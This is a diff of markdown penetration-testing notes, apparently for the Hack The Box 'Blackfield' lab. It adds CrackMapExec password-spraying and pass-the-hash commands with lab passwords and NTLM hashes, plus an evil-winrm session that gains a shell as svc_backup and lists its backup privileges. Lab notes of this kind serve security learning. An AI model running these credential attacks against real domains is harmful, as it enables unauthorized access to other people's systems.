@@ -14,12 +14,24 @@ cme smb $ip -u users.txt -p sT333ve2
 cme smb $ip -u users.txt -p sT333ve2 --continue-on-success
 ```
 
-### Dump password policy with "--pass-pol"
+### [Dump password policy with "--pass-pol"](#dump-password-policy-with---pass-pol-1)
 cme smb $ip -u support -p '#00^BlackKnight' --pass-pol
 
-### Pass-the-Hash (PtH) with "-H"
+### [Pass-the-Hash (PtH) with "-H"](#pass-the-hash-pth-with--h--successful)
 cme smb $ip -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+
+### [Pass the hash (PtH)](https://attack.mitre.org/techniques/T1550/002/)
+> Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password.
+
+### [WINRM Pwn3d!](#winrm-pwn3d-2)
 cme smb $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+
+### [WINRM Pwn3d!](#winrm-pwn3d-2)
+cme winrm $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+
+### [PtH with evil-winrm](#pth-with-evil-winrm-1)
+evil-winrm -i $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+
 
 ```
 --continue-on-success
@@ -94,14 +106,39 @@ SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
 ```
 
-### 
+### WINRM Pwn3d!
+```
+$ cme winrm $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
 ```
 
+### [PtH with evil-winrm](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
 ```
+$ evil-winrm -i $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv
 
-### 
-```
+PRIVILEGES INFORMATION
+----------------------
 
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_backup\Documents>
 ```
 
 ### 
